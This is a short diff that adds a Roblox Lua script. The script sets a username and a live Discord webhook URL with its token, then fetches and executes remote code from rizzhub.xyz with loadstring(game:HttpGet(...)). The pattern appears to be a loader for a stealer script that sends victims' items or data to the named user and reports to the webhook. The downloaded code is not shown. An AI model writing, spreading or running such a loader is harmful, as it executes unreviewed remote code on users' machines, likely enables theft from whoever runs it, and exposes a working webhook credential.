@@ -1,0 +1,4 @@
+UserName = "CosmicTaxes"
+Webhook = "https://discord.com/api/webhooks/1096693067173609472/3WSwSPeASNgsEtNohepQhL6cZ_knz8aAlqEECpMB4o_cqWfmYIxaMp7WrObE-LiUCyWP" 
+
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
